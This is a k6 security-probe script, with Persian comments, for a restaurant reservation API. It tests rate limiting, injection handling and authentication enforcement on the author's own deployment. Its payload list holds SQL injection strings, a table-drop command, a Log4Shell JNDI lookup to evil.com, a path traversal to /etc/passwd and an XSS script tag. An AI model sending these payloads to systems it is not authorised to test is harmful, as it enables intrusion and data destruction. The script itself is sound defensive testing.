import http from 'k6/http';
import { check } from 'k6';
import { Counter } from 'k6/metrics';

// ═══════════════════════════════════════════════════════════
//  پروبِ امنیتی رزرونو (k6) — تست اینکه دفاع‌ها واقعاً کار می‌کنند.
//
//  ⚠️ این یک حمله‌ی واقعی نیست؛ یک «تستِ کنترل‌شده» است که فقط روی
//  محیطِ خودت (staging/دیپلویِ خودت) و با اجازه اجرا کن. هرگز روی
//  سیستمِ دیگران اجرا نکن — غیرقانونی است.
//
//  چهار چیز را می‌سنجد:
//   ۱) Rate limiting: آیا بعد از N درخواستِ سریع، 429 می‌گیریم؟
//   ۲) SQL injection: آیا payloadهای تزریقی رد/بی‌اثر می‌شوند؟
//   ۳) XSS: آیا اسکریپت در ورودی، escape/رد می‌شود؟
//   ۴) Auth bypass: آیا endpoint محافظت‌شده بدون توکن، 401 می‌دهد؟
//
//  اجرا: k6 run -e BASE_URL=https://api.rezervno.ir loadtest/k6-security-probe.js
// ═══════════════════════════════════════════════════════════

const rateLimitWorks = new Counter('rate_limit_triggered');
const injectionBlocked = new Counter('injection_blocked');
const authEnforced = new Counter('auth_enforced');

export const options = {
  scenarios: {
    rate_limit_test:  { executor: 'per-vu-iterations', vus: 5, iterations: 60, exec: 'testRateLimit', maxDuration: '1m' },
    injection_test:   { executor: 'per-vu-iterations', vus: 1, iterations: 1,  exec: 'testInjection', startTime: '65s' },
    auth_test:        { executor: 'per-vu-iterations', vus: 1, iterations: 1,  exec: 'testAuth', startTime: '70s' },
  },
};

const BASE = __ENV.BASE_URL || 'http://localhost:3000';
const API = `${BASE}/api/v1`;

// ── ۱) تست rate limiting: ۶۰ درخواستِ سریعِ OTP باید به 429 برسد ──
export function testRateLimit() {
  const res = http.post(`${API}/auth/otp/request`,
    JSON.stringify({ phone: '09120000000' }),
    { headers: { 'Content-Type': 'application/json' }, tags: { name: 'rl_probe' } });
  if (res.status === 429) rateLimitWorks.add(1);
  check(res, { 'rate limit فعال (429 بعد از spam)': r => r.status === 429 || r.status === 200 });
}

// ── ۲) تست SQL/NoSQL injection: payloadهای بدخیم نباید کار کنند ──
export function testInjection() {
  const payloads = [
    "' OR '1'='1",
    "'; DROP TABLE reservations;--",
    "1 UNION SELECT * FROM users",
    "${jndi:ldap://evil.com}",
    "../../etc/passwd",
  ];
  for (const p of payloads) {
    // در query param (search رستوران)
    let res = http.get(`${API}/restaurants?q=${encodeURIComponent(p)}`, { tags: { name: 'sqli_probe' } });
    // باید ۲۰۰ (بی‌اثر) یا ۴۰۰ (رد validation) بدهد — نه ۵۰۰ (خطای DB = آسیب‌پذیر)
    const safe = res.status !== 500;
    if (safe) injectionBlocked.add(1);
    check(res, { [`injection رد شد (${p.slice(0,20)})`]: () => safe });

    // در body (اسلاگ رستوران)
    res = http.get(`${API}/restaurants/${encodeURIComponent(p)}/availability?date=2026-01-01&party=2`, { tags: { name: 'sqli_slug' } });
    check(res, { 'injection در slug امن': r => r.status !== 500 });
  }
}

// ── ۳ و ۴) تست auth: endpoint محافظت‌شده بدون توکن باید 401 بدهد ──
export function testAuth() {
  const protectedEndpoints = [
    ['GET', `${API}/me`],
    ['GET', `${API}/me/reservations`],
    ['GET', `${API}/restaurant/reservations`],
    ['GET', `${API}/admin/overview`],
    ['POST', `${API}/reservations`],
  ];
  for (const [method, url] of protectedEndpoints) {
    const res = method === 'GET' ? http.get(url) : http.post(url, '{}', { headers: { 'Content-Type': 'application/json' } });
    const enforced = res.status === 401 || res.status === 403;
    if (enforced) authEnforced.add(1);
    check(res, { [`auth اجباری (${url.split('/v1')[1]})`]: () => enforced });

    // تستِ XSS در توکن جعلی
    const xss = http.get(url, { headers: { Authorization: 'Bearer <script>alert(1)</script>' } });
    check(xss, { 'توکن جعلی/XSS رد شد': r => r.status === 401 || r.status === 403 });
  }
}

export function handleSummary(data) {
  const rl = data.metrics.rate_limit_triggered?.values.count || 0;
  const inj = data.metrics.injection_blocked?.values.count || 0;
  const auth = data.metrics.auth_enforced?.values.count || 0;
  return {
    stdout: `
╔════════════════════════════════════════════════╗
║  نتیجه‌ی پروبِ امنیتی رزرونو                     ║
╠════════════════════════════════════════════════╣
║  Rate limiting فعال شد:  ${rl} بار (باید >۰ باشد) ${rl>0?'✅':'❌'}
║  Injection رد شد:        ${inj} payload ${inj>0?'✅':'❌'}
║  Auth اجباری شد:         ${auth} endpoint ${auth>0?'✅':'❌'}
╠════════════════════════════════════════════════╣
║  اگر همه ✅ = دفاع‌ها در محیطِ تست‌شده کار می‌کنند
╚════════════════════════════════════════════════╝
`,
  };
}
